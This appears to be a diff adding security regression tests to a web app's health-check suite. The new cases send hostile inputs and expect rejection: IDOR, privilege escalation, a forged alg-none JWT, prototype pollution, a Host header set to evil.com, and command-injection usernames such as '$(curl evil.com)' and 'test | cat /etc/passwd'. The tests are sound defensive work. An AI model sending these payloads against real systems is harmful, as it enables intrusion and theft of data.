@@ -364,6 +364,67 @@ const TEST_SUITE: TestCase[] = [
   { name: "arquitetura: push-test 401 retorna JSON", category: "regression", fn: "push-test", method: "POST", body: {}, expect: { status: [401], hasKey: "error" } },
 
   // ═══════════════════════════════════════════════
+  // 🔴 ATAQUE: IDOR — acessar dados de outro usuário (4 tests)
+  // ═══════════════════════════════════════════════
+  { name: "idor: content-alerts listar alertas de outro user não vaza dados sensíveis", category: "security", fn: "content-alerts", method: "POST", body: { action: "list", username: "vitima_idor_test" }, expect: { status: [200], hasKey: "alerts" } },
+  { name: "idor: match-reminders listar lembretes de outro user", category: "security", fn: "match-reminders", method: "POST", body: { action: "list", username: "vitima_idor_test" }, expect: { status: [200], hasKey: "reminders" } },
+  { name: "idor: trailer-challenge acessar progresso de outro user", category: "security", fn: "trailer-challenge", method: "POST", body: { action: "watch_trailer", username: "vitima_idor_test" }, expect: { status: [200] } },
+  { name: "idor: user-presence logout de outro user sem ser admin", category: "security", fn: "user-presence", method: "POST", body: { action: "logout", username: "admin" }, expect: { status: [200, 400, 403] } },
+
+  // ═══════════════════════════════════════════════
+  // 🔴 ATAQUE: Escalação de Privilégio (5 tests)
+  // ═══════════════════════════════════════════════
+  { name: "privesc: client tenta acessar manage-clients sem admin", category: "security", fn: "manage-clients", method: "GET", expect: { status: [401] } },
+  { name: "privesc: client tenta rodar testes sem admin", category: "security", fn: "system-health-check", method: "POST", body: { trigger: "manual" }, expect: { status: [401] } },
+  { name: "privesc: client tenta deletar resultados sem admin", category: "security", fn: "system-health-check", method: "DELETE", body: { all: true }, expect: { status: [401] } },
+  { name: "privesc: client tenta enviar push sem admin", category: "security", fn: "push-test", method: "POST", body: { action: "send", title: "Hack", body: "pwned" }, expect: { status: [401] } },
+  { name: "privesc: auth header com admin:admin (padrão fraco)", category: "security", fn: "manage-clients", method: "GET", headers: { "x-admin-auth": btoa("admin:admin") }, expect: { status: [401] } },
+
+  // ═══════════════════════════════════════════════
+  // 🔴 ATAQUE: Token/Auth Manipulation (5 tests)
+  // ═══════════════════════════════════════════════
+  { name: "token: x-admin-auth com base64 inválido", category: "security", fn: "manage-clients", method: "GET", headers: { "x-admin-auth": "!!!invalid-base64!!!" }, expect: { status: [401] } },
+  { name: "token: x-admin-auth vazio", category: "security", fn: "manage-clients", method: "GET", headers: { "x-admin-auth": "" }, expect: { status: [401] } },
+  { name: "token: x-admin-auth com null bytes", category: "security", fn: "manage-clients", method: "GET", headers: { "x-admin-auth": btoa("admin\x00:pass\x00") }, expect: { status: [401] } },
+  { name: "token: Authorization header forjado", category: "security", fn: "manage-clients", method: "GET", headers: { "Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoic2VydmljZV9yb2xlIn0." }, expect: { status: [401] } },
+  { name: "token: x-admin-auth com separador extra", category: "security", fn: "manage-clients", method: "GET", headers: { "x-admin-auth": btoa("admin:pass:extra:fields") }, expect: { status: [401] } },
+
+  // ═══════════════════════════════════════════════
+  // 🔴 ATAQUE: Prototype Pollution / JSON Injection (4 tests)
+  // ═══════════════════════════════════════════════
+  { name: "proto-pollution: __proto__ em client-login", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test", password: "test", "__proto__": { "isAdmin": true } }, expect: { status: [200, 400, 403] } },
+  { name: "proto-pollution: constructor.prototype em user-presence", category: "security", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "test", "constructor": { "prototype": { "admin": true } } }, expect: { status: [200, 400] } },
+  { name: "json-inject: campo extra isAdmin em client-login", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test", password: "test", isAdmin: true, role: "admin" }, expect: { status: [200, 400] } },
+  { name: "json-inject: action override com array", category: "security", fn: "content-alerts", method: "POST", body: { action: ["list", "delete_all"], username: "test" }, expect: { status: [400, 500] } },
+
+  // ═══════════════════════════════════════════════
+  // 🔴 ATAQUE: Enumeração de Usuários (3 tests)
+  // ═══════════════════════════════════════════════
+  { name: "enum: login inválido não revela se user existe (msg genérica)", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "usuario_que_nao_existe_xyz", password: "wrong" }, expect: { status: [200], hasKey: "success" } },
+  { name: "enum: admin-login não diferencia user vs pass errado", category: "security", fn: "admin-login", method: "POST", body: { user: "real_admin_test", pass: "wrong" }, expect: { status: [401], hasKey: "error" } },
+  { name: "enum: admin-login com user correto e pass errado = mesmo erro", category: "security", fn: "admin-login", method: "POST", body: { user: "nonexistent_admin", pass: "wrong" }, expect: { status: [401], hasKey: "error" } },
+
+  // ═══════════════════════════════════════════════
+  // 🔴 ATAQUE: Header Injection (3 tests)
+  // ═══════════════════════════════════════════════
+  { name: "header-inject: content-type manipulado", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test", password: "test" }, headers: { "Content-Type": "application/json; charset=utf-7" }, expect: { status: [200, 400] } },
+  { name: "header-inject: x-forwarded-for spoofing", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test", password: "test" }, headers: { "X-Forwarded-For": "127.0.0.1" }, expect: { status: [200, 400] } },
+  { name: "header-inject: host header injection", category: "security", fn: "admin-login", method: "POST", body: { user: "x", pass: "y" }, headers: { "Host": "evil.com" }, expect: { status: [401] } },
+
+  // ═══════════════════════════════════════════════
+  // 🔴 ATAQUE: Brute Force Simulation (2 tests)
+  // ═══════════════════════════════════════════════
+  { name: "bruteforce: 5 logins rápidos não crasham o sistema", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "brute_test_1", password: "attempt1" }, expect: { status: [200, 429] } },
+  { name: "bruteforce: admin-login rápido não vaza info", category: "security", fn: "admin-login", method: "POST", body: { user: "brute_admin", pass: "attempt1" }, expect: { status: [401], notContains: ["admin_user", "admin_pass", "ADMIN_USER", "ADMIN_PASS"] } },
+
+  // ═══════════════════════════════════════════════
+  // 🔴 ATAQUE: Command Injection via campos (3 tests)
+  // ═══════════════════════════════════════════════
+  { name: "cmd-inject: username com pipe command", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test | cat /etc/passwd", password: "test" }, expect: { status: [400, 403] } },
+  { name: "cmd-inject: username com backtick", category: "security", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "`whoami`" }, expect: { status: [400, 403] } },
+  { name: "cmd-inject: username com $() substitution", category: "security", fn: "content-alerts", method: "POST", body: { action: "list", username: "$(curl evil.com)" }, expect: { status: [200, 400, 403] } },
+
+  // ═══════════════════════════════════════════════
   // Cleanup de dados de teste (3 tests)
   // ═══════════════════════════════════════════════
   { name: "user-presence: cleanup hc_test", category: "functional", fn: "user-presence", method: "POST", body: { action: "logout", username: "health_check_test" }, expect: { status: [200] } },
